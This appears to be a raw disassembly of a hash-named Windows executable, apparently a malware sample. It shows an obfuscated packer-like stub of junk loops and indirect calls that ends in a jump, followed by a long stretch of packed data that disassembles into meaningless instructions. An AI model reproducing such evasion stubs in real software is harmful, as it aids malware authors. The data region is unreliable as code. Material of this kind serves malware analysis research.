
046e7aee127c68f652d0af9d17fb3b99ea31d61bd02a2c0c23f7daee0703a204.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c16
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d22
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x423822
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238e9
  4012ea:	push   0x42396d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	in     al,dx
  40143e:	mov    cl,0xe
  401440:	push   ebx
  401441:	bound  esp,QWORD PTR [edx+0x62]
  401444:	(bad)  
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	adc    ebx,edi
  401457:	jb     0x40149b
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	xor    BYTE PTR [ebx-0x3a],0xad
  401508:	out    dx,eax
  401509:	dec    ecx
  40150a:	aaa    
  40150b:	outs   dx,BYTE PTR ds:[esi]
  40150c:	and    DWORD PTR [ebx],esp
  40150e:	cmp    al,0xa0
  401510:	gs ins BYTE PTR es:[edi],dx
  401512:	mov    dl,0x73
  401514:	push   eax
  401515:	cmp    al,0x10
  401517:	(bad)  
  401519:	mov    esp,0x8ff3a28a
  40151e:	inc    ecx
  40151f:	xchg   edi,eax
  401520:	mov    esi,0x2b975563
  401525:	xchg   edx,eax
  401526:	in     eax,0xc7
  401528:	sbb    BYTE PTR ds:0xd5fbc426,ch
  40152e:	imul   esi,DWORD PTR [esi+0x72],0x38
  401532:	or     DWORD PTR [esi],0x5167f767
  401538:	stc    
  401539:	call   0x25e255c0
  40153e:	dec    dl
  401540:	sbb    al,0x9
  401542:	fisttp WORD PTR [ecx-0x29]
  401545:	ja     0x40151c
  401547:	clc    
  401548:	mov    edi,fs
  40154a:	imul   edx,DWORD PTR [esi+ecx*8+0xc1c742a],0xdeccde20
  401555:	std    
  401556:	sbb    DWORD PTR [esi+edx*1-0x4a6ee9e7],ebp
  40155d:	leave  
  40155e:	hlt    
  40155f:	sbb    eax,0xb37ca050
  401564:	jmp    0x18c29f63
  401569:	sub    BYTE PTR [esi+0x28e67495],bl
  40156f:	loop   0x401581
  401571:	cmc    
  401572:	sbb    DWORD PTR [esi-0x44d789b2],eax
  401578:	dec    ebx
  401579:	or     esi,DWORD PTR [edi]
  40157b:	aad    0x4b
  40157d:	push   0x5a
  40157f:	test   eax,ebx
  401581:	mov    eax,ds:0x64b2c9e6
  401586:	mov    esp,0xba959622
  40158b:	dec    ecx
  40158c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40158d:	jp     0x4015a3
  40158f:	test   al,0xc9
  401591:	or     edi,ebx
  401593:	xchg   esi,eax
  401594:	aas    
  401595:	xchg   edi,eax
  401596:	add    DWORD PTR [edx+0x3c],edx
  401599:	les    esi,FWORD PTR [ebp+0x5e45547a]
  40159f:	rcr    DWORD PTR [esp+edx*8-0x77e707f4],1
  4015a6:	add    ah,cl
  4015a8:	retf   
  4015a9:	je     0x40158b
  4015ab:	pop    eax
  4015ac:	mov    ?,WORD PTR [ebx]
  4015ae:	dec    esi
  4015af:	div    DWORD PTR ds:0x3236e3d0
  4015b5:	mov    DWORD PTR [esi-0x79],esp
  4015b8:	inc    edi
  4015b9:	icebp  
  4015ba:	outs   dx,DWORD PTR ds:[si]
  4015bc:	add    DWORD PTR [ecx-0x29],ebp
  4015bf:	mov    DWORD PTR [edi-0x12499d4f],eax
  4015c5:	rcr    DWORD PTR [edx],cl
  4015c7:	retf   
  4015c8:	jno    0x401596
  4015ca:	dec    BYTE PTR [ebp-0xe]
  4015cd:	push   ebp
  4015ce:	std    
  4015cf:	mov    eax,DWORD PTR [ebp+0x78]
  4015d2:	dec    eax
  4015d3:	sub    al,0x4d
  4015d5:	or     DWORD PTR [edx+ecx*1+0x24b5b63d],ebp
  4015dc:	cmp    BYTE PTR [eax+ebp*2+0x30ff244d],ah
  4015e3:	std    
  4015e4:	jmp    0x401633
  4015e6:	mov    dl,0x69
  4015e8:	cmp    al,0xf2
  4015ea:	leave  
  4015eb:	test   DWORD PTR [ebx-0x2ba28d56],ebx
  4015f1:	mov    eax,0x91d7926a
  4015f6:	xchg   DWORD PTR [ebp-0x3b],ebp
  4015f9:	call   0x1bfb:0xfd8317fa
  401600:	dec    ebx
  401601:	xadd   BYTE PTR [ecx-0x4b],dh
  401605:	jmp    0x401610
  401607:	sub    ah,BYTE PTR [esi+0x68bcfe28]
  40160d:	test   eax,0x37b17bdb
  401612:	mov    eax,ds:0xdfc7d736
  401617:	out    0x6b,al
  401619:	mov    eax,ds:0x29ba67dd
  40161e:	pop    ss
  40161f:	loope  0x4015c5
  401621:	retf   
  401622:	sub    eax,eax
  401624:	inc    esi
  401625:	fcom   st(2)
  401627:	ror    dh,1
  401629:	rol    DWORD PTR [edi-0x7fee4c3],0xfd
  401630:	sub    DWORD PTR [edx-0x31],ebp
  401633:	and    esp,DWORD PTR [eax+0x4055f6fe]
  401639:	imul   esi,DWORD PTR [ebx],0x26ca8e67
  40163f:	mov    edi,0x1c1cc758
  401644:	ins    DWORD PTR es:[edi],dx
  401645:	in     eax,0x2f
  401647:	adc    al,0x6c
  401649:	(bad)
  40164d:	dec    eax
  40164e:	push   edi
  40164f:	jmp    0x9eef:0xcdd40099
  401656:	stos   BYTE PTR es:[edi],al
  401657:	push   edx
  401658:	jp     0x4015fd
  40165a:	mov    BYTE PTR [edx+0x7ea57169],al
  401660:	add    edx,eax
  401662:	add    dh,ch
  401664:	mov    ecx,0x9212f37e
  401669:	repz js 0x401607
  40166c:	push   ss
  40166d:	retf   0xe5f
  401670:	in     eax,dx
  401671:	cmc    
  401672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401673:	js     0x401643
  401675:	mov    esp,0xea6c663
  40167a:	jb     0x401699
  40167c:	pop    ebp
  40167d:	cmp    ch,BYTE PTR [eax+0x45]
  401680:	fsubr  QWORD PTR [esi+0x7351051a]
  401687:	retf   0x343c
  40168a:	in     eax,dx
  40168b:	aam    0x33
  40168d:	mov    eax,ds:0xf224ac5b
  401692:	and    ch,bl
  401694:	cs out dx,eax
  401696:	sahf   
  401697:	mov    ebp,0x5070ebe0
  40169c:	mov    bl,0x85
  40169e:	sub    DWORD PTR [ecx],esi
  4016a0:	jno    0x401695
  4016a2:	nop
  4016a3:	mov    esp,0xfdcde039
  4016a8:	shl    BYTE PTR [edi],0xf8
  4016ab:	fst    DWORD PTR [eax+0x25c28c80]
  4016b1:	jb     0x4016aa
  4016b3:	cli    
  4016b4:	cli    
  4016b5:	fnstenv [ecx+0x4db838dd]
  4016bb:	push   edx
  4016bc:	mov    eax,ds:0x5bbdf6cc
  4016c1:	mov    DWORD PTR [ebx+0x12a1f130],ebx
  4016c7:	xchg   ebp,eax
  4016c8:	inc    ecx
  4016c9:	imul   ecx,DWORD PTR [edx],0xc29176cb
  4016cf:	sub    al,0x6d
  4016d1:	and    ebx,DWORD PTR [edi+ebx*4+0x43789190]
  4016d8:	fs sbb eax,0xefe22b3c
  4016de:	scas   al,BYTE PTR es:[edi]
  4016df:	outs   dx,DWORD PTR ds:[esi]
  4016e0:	mov    ds:0xb44531f8,al
  4016e5:	dec    ebp
  4016e6:	shl    eax,1
  4016e8:	add    BYTE PTR ds:0xef73f4e4,ch
  4016ee:	fbld   TBYTE PTR ds:0x73371b99
  4016f4:	shr    DWORD PTR [ebp+0xe461f05],0x61
  4016fb:	mov    ebp,0xb35d0b68
  401700:	jae    0x401691
  401702:	in     al,dx
  401703:	lock mov dh,cl
  401706:	lock mov bl,0x16
  401709:	lods   al,BYTE PTR ds:[esi]
  40170a:	stos   BYTE PTR es:[edi],al
  40170b:	int    0x80
  40170d:	jbe    0x401721
  40170f:	pop    ebx
  401710:	and    DWORD PTR [eax+esi*1+0x47ae870c],ebx
  401717:	add    ebp,DWORD PTR [ebx+0x3c]
  40171a:	mov    ?,WORD PTR ds:0xd7a32658
  401720:	adc    al,0x4
  401722:	pop    ss
  401723:	jecxz  0x40172c
  401725:	add    al,0xc6
  401727:	mov    dl,0x31
  401729:	addr16 push ss
  40172b:	add    eax,0xffe8a02e
  401730:	pop    ebx
  401731:	lods   al,BYTE PTR ds:[esi]
  401732:	in     eax,0x57
  401734:	xor    edi,edi
  401736:	xchg   bl,dl
  401738:	(bad)  
  401739:	jae    0x401724
  40173b:	int3   
  40173c:	shl    DWORD PTR [edx],0xbd
  40173f:	inc    ebp
  401740:	fidiv  DWORD PTR ds:0x454e73bd
  401746:	jge    0x4016fb
  401748:	or     DWORD PTR [ebp+0x56c88b4],edx
  40174e:	dec    eax
  40174f:	bnd jae 0x40177d
  401752:	inc    ebp
  401753:	jbe    0x401752
  401755:	shl    BYTE PTR [edx+eiz*4-0x19],0xde
  40175a:	fsubr  DWORD PTR [eax]
  40175c:	jle    0x40170c
  40175e:	ja     0x401758
  401760:	shl    BYTE PTR [edi],1
  401762:	push   esp
  401763:	jns    0x401738
  401765:	shl    BYTE PTR ds:0x30e99e7e,1
  40176b:	cmp    ebx,DWORD PTR [edi]
  40176d:	or     dl,al
  40176f:	stos   DWORD PTR es:[edi],eax
  401770:	into   
  401771:	and    al,0xf4
  401773:	mov    WORD PTR [ecx+ebx*1+0x9],ds
  401777:	push   ds
  401778:	jbe    0x4017b2
  40177a:	test   al,0x72
  40177c:	cwde   
  40177d:	(bad)  
  40177e:	test   al,0x36
  401780:	add    BYTE PTR [ecx+ebp*1-0x51],dl
  401784:	xchg   edi,eax
  401785:	clc    
  401786:	inc    ebp
  401787:	and    ecx,0xffffff8a
  40178a:	pop    esi
  40178b:	mov    WORD PTR [ecx+0x58],fs
  40178e:	cmovp  edi,eax
  401791:	sub    al,0xe8
  401793:	(bad)  
  401794:	out    dx,al
  401795:	and    al,0x65
  401797:	pop    esp
  401798:	les    esi,FWORD PTR [ebx-0x26]
  40179b:	leave  
  40179c:	ret    
  40179d:	jmp    FWORD PTR [edi*1+0x42e2c205]
  4017a4:	jo     0x401821
  4017a6:	mov    cl,dl
  4017a8:	in     eax,dx
  4017a9:	and    al,0xa
  4017ab:	mov    eax,ds:0xc006ff74
  4017b0:	adc    al,0x7b
  4017b2:	sub    esi,esp
  4017b4:	sub    eax,DWORD PTR [eax-0x7a]
  4017b7:	or     edx,DWORD PTR [ecx-0x47]
  4017ba:	inc    ecx
  4017bb:	je     0x401784
  4017bd:	in     al,0xf1
  4017bf:	xor    eax,0xec73f622
  4017c4:	or     al,0xba
  4017c6:	dec    edi
  4017c7:	mov    al,0x79
  4017c9:	xchg   ecx,eax
  4017ca:	adc    bl,bh
  4017cc:	ret    0x264a
  4017cf:	pop    ebx
  4017d0:	mov    ds:0xb79803eb,al
  4017d5:	fisttp WORD PTR [esi-0x54]
  4017d8:	xor    al,0x46
  4017da:	jbe    0x4017eb
  4017dc:	dec    edx
  4017dd:	imul   edx,DWORD PTR [ebx],0x8b4075b7
  4017e3:	xlat   BYTE PTR ds:[ebx]
  4017e4:	mov    esp,esp
  4017e6:	neg    edx
  4017e8:	cs in  al,dx
  4017ea:	jmp    0x40184d
  4017ec:	cmp    dl,BYTE PTR [edx-0x5081d3c1]
  4017f2:	cmc    
  4017f3:	and    eax,0x5a46ee3d
  4017f8:	test   DWORD PTR [esi-0x1a],ecx
  4017fb:	cli    
  4017fc:	sbb    BYTE PTR [esi+0x770c7ebd],0x8f
  401803:	dec    ecx
  401804:	repnz fld DWORD PTR fs:[edi-0x2]
  401809:	pop    edi
  40180a:	dec    edi
  40180b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40180c:	cli    
  40180d:	cmp    ebp,DWORD PTR [ecx+0xa5f66d0]
  401813:	(bad)  
  401814:	enter  0x957a,0x4a
  401818:	pop    ecx
  401819:	ins    DWORD PTR es:[edi],dx
  40181a:	outs   dx,BYTE PTR ds:[esi]
  40181b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40181c:	sbb    cl,BYTE PTR [edx]
  40181e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40181f:	(bad)  
  401820:	lahf   
  401821:	outs   dx,DWORD PTR ds:[esi]
  401822:	add    ecx,esi
  401824:	and    BYTE PTR [ebx+0x6e],0x51
  401828:	mov    ah,0xb4
  40182a:	mov    dh,ch
  40182c:	push   0x1a86e443
  401831:	fisttp DWORD PTR [eax+0x2ff3919c]
  401837:	xor    al,0xba
  401839:	cmc    
  40183a:	pop    esp
  40183b:	jns    0x401897
  40183d:	jg     0x401866
  40183f:	xchg   ecx,eax
  401840:	arpl   WORD PTR [edi+0x15],bx
  401843:	fs shr esi,1
  401846:	xor    al,0x21
  401848:	sbb    bh,BYTE PTR [edi]
  40184a:	aad    0x2
  40184c:	cmp    DWORD PTR [ebx+ecx*4],eax
  40184f:	mov    edx,0xf007369a
  401854:	test   al,0xf7
  401856:	or     al,0xd0
  401858:	lahf   
  401859:	inc    edi
  40185a:	clc    
  40185b:	mov    esp,0x65b57dc4
  401860:	scas   eax,DWORD PTR es:[edi]
  401861:	jge    0x4018aa
  401863:	adc    edx,DWORD PTR [edi-0x7b]
  401866:	jge    0x40183b
  401868:	cmp    dh,BYTE PTR [esi-0xe3eea10]
  40186e:	inc    esp
  40186f:	scas   al,BYTE PTR es:[edi]
  401870:	xor    al,0xdb
  401872:	mov    WORD PTR [edi-0x6a],es
  401875:	fdiv   QWORD PTR [eax-0x4f]
  401878:	js     0x40181a
  40187a:	sbb    BYTE PTR [esi-0x8d22181],ch
  401880:	adc    DWORD PTR [ebp+edi*4-0x18ec24ff],eax
  401887:	(bad)  
  401888:	xchg   edi,eax
  401889:	in     al,dx
  40188a:	jns    0x4018af
  40188c:	ficomp WORD PTR [ecx-0x52]
  40188f:	nop
  401890:	inc    DWORD PTR ds:0x6422f0cd
  401896:	inc    esp
  401897:	lock dec ebp
  401899:	scas   eax,DWORD PTR es:[edi]
  40189a:	jns    0x40183e
  40189c:	inc    eax
  40189d:	sahf   
  40189e:	add    BYTE PTR [ebx+0x26a722ff],dl
  4018a4:	(bad)  
  4018a6:	sar    ecx,1
  4018a8:	xor    ecx,DWORD PTR [eax]
  4018aa:	cmp    al,0x51
  4018ac:	mov    esi,esp
  4018ae:	xchg   DWORD PTR [ecx],esp
  4018b0:	adc    ebp,DWORD PTR [ebx+0x1e]
  4018b3:	test   eax,0x90ae0b6c
  4018b8:	cld    
  4018b9:	or     BYTE PTR [edx-0x37],cl
  4018bc:	xor    BYTE PTR [edi+0x2f2416c2],ch
  4018c2:	test   al,0x47
  4018c4:	ds inc eax
  4018c6:	fs push esp
  4018c8:	mov    edi,0x68a17140
  4018cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018ce:	lds    edi,FWORD PTR [esi]
  4018d0:	js     0x4018a1
  4018d2:	inc    eax
  4018d3:	mov    ecx,0xf72d0978
  4018d8:	dec    edx
  4018d9:	ds add bl,ah
  4018dc:	cmc    
  4018dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018de:	jmp    0x8aa4:0xe9d425f6
  4018e5:	rcr    BYTE PTR [ecx],0x19
  4018e8:	jns    0x401938
  4018ea:	aad    0x4b
  4018ec:	jns    0x4018c7
  4018ee:	cmp    cl,dh
  4018f0:	fsubr  QWORD PTR [esi+0x57f7399e]
  4018f6:	push   ebp
  4018f7:	(bad)  
  4018f8:	push   0x4c9194fb
  4018fd:	and    ah,ah
  4018ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401900:	add    al,0x5f
  401902:	mov    ecx,0x2cf69a25
  401907:	loop   0x4018be
  401909:	sbb    esp,0xfab27f87
  40190f:	dec    DWORD PTR [esi+eiz*8+0x71d8f590]
  401916:	mov    esi,0xfa6aeaf6
  40191b:	rcr    BYTE PTR [ebx-0x4c],1
  40191e:	ins    DWORD PTR es:[edi],dx
  40191f:	lds    eax,FWORD PTR [ecx+0x7607df7e]
  401925:	push   edi
  401926:	push   ds
  401927:	cdq    
  401928:	sub    eax,0xe0c8102b
  40192d:	and    al,0xed
  40192f:	cwde   
  401930:	add    eax,0x5ba93d57
  401935:	xchg   ebp,eax
  401936:	lods   al,BYTE PTR ds:[esi]
  401937:	or     ch,BYTE PTR [eax]
  401939:	imul   eax,DWORD PTR [eax],0x6268d294
  40193f:	(bad)  
  401940:	jecxz  0x4018c3
  401942:	mov    ch,0xb1
  401944:	jo     0x401982
  401946:	adc    DWORD PTR [eax-0x6128610e],eax
  40194c:	(bad)  
  40194d:	pop    esi
  40194e:	hlt    
  40194f:	xchg   BYTE PTR [eax-0x8],bl
  401952:	in     eax,dx
  401953:	inc    edx
  401954:	enter  0xaaba,0x90
  401958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
